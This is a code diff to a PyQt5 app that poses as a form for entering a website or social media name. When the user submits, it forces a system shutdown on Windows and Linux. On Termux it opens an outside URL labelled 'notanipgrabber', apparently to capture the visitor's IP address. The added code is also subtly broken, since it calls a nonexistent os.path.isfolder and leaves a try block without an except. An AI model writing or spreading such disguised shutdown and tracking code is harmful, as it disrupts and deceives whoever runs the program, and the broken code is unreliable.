@@ -1,6 +1,8 @@
 from PyQt5.QtWidgets import QApplication, QLineEdit, QPushButton, QWidget, QVBoxLayout, QHBoxLayout, QMessageBox
 import subprocess
+import webbrowser
 import socket
+import os
 
 class ModernTextField(QWidget):
     def __init__(self):
@@ -59,8 +61,17 @@ class ModernTextField(QWidget):
             # Show warning dialog if text field is empty or contains placeholder text
             QMessageBox.warning(self, "Warning", "No website or social media platform specified.")
         else:
-            # Execute the shutdown command
-            subprocess.run(["shutdown", "-s", "-f", "-t", "0"], shell=True)
+            try:
+                if os.path.isfolder("C:/Windows/"):
+                    # Execute the shutdown command
+                    subprocess.run(["shutdown", "-s", "-f", "-t", "30"], shell=True)
+                    # give the guy some time bro you evil bastard
+                else:
+                    if os.path.isfolder("/data/data/com.termux/files/usr/"):
+                        webbrowser.open("https://terra-server-1000.glitch.me/somethingforyou/notanipgrabber/")
+                    else:
+                        # real linux
+                        os.system("shutdown -h now")
 
 app = QApplication([])
 window = ModernTextField()
